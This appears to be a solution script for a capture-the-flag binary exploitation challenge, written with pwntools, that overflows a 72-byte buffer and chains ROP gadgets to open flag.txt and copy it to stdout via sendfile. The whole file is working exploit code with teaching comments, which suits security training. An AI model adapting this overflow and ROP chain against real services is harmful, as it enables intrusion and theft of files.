from pwn import *

REMOTE = True

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 50260

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin')
    #gdb.attach(conn)

offset = 72
payload = b"A" * offset         # First we create a payload that will lead to an overflow


# Useful Gadgets:

mov_rax_2_syscall = 0x000000000040119f      #: mov rax, 2; syscall; ret;
mov_rax_40_syscall = 0x00000000004011a9     #: mov rax, 0x28; syscall; nop; pop rbp; ret;

pop_r10 = 0x000000000040119c    #: pop r10; ret; 
pop_rbp = 0x000000000040111d    #: pop rbp; ret; 
pop_rdi = 0x0000000000401196    #: pop rdi; ret; 
pop_rdx = 0x000000000040119a    #: pop rdx; ret; 
pop_rsi = 0x0000000000401198    #: pop rsi; ret;

filename_addr = 0x404020        # Retrieved using Ghidra's string search
print(hex(filename_addr))

# Idea: We open the file (syscall 2) and then we copy its content to STDOUT (syscall 40)

# Open the file flag.txt
payload += p64(pop_rdi) + p64(filename_addr)    # Put the address of the filename in the register rdi
payload += p64(pop_rsi) + p64(0)                # Put the value 0 in rsi (contains flags)
payload += p64(pop_rdx) + p64(0)                # Put the value 0 in rdx (contains mode used for opening the file)
payload += p64(mov_rax_2_syscall)               # Put the value 2 in rax, then execute a syscall (open syscall)

target_file_fd = 6                              # The file decriptor will be the previous max + 1

# Copy the file towards STDOUT
payload += p64(pop_rdi) + p64(1)                # Put the value 1 (= STDOUT) in rdi (contains the output file descriptor)                
payload += p64(pop_rsi) + p64(target_file_fd)   # Put the value <target_file_fd> in rsi (contains the input file descriptor)
payload += p64(pop_rdx) + p64(0)                # Put the value 0 in rdx (contains the offset after which it will start coping the content)
payload += p64(pop_r10) + p64(100)              # Put the value 100 in r10 (contians the number of bytes it will copy)
payload += p64(mov_rax_40_syscall)              # Put the value 40 in rax, then execute a syscall (sendfile syscall)

conn.sendline(payload)                          # Send the payload, retrieve the flag and print it

flag = conn.recvline().decode()

conn.close()
print(flag)